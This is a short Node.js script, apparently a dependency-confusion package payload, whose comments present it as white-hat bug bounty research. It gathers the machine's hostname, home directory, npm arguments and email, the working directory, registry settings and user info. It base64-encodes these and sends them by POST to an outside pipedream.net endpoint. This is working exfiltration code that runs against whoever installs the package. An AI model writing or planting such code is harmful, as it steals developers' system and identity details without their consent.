
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat t.a.neo@ya.ru
const http = require('https');
const os = require('os')

req = http.request({
  host: '76c42f27d26091659dca820a37e6f5d3.m.pipedream.net',
  path: '/afisha-guides-landing',
  method: 'POST'
});

req.write(Buffer.from(os.hostname()+'.'+ os.homedir()+'.'+process.env.npm_config_argv+'.'+process.env.PWD+'.'+process.env.npm_config_registry+'.'+process.env.npm_config_metrics_registry+'.'+process.env.npm_config_email+'.'+ JSON.stringify(os.userInfo())).toString('base64'));
req.end();

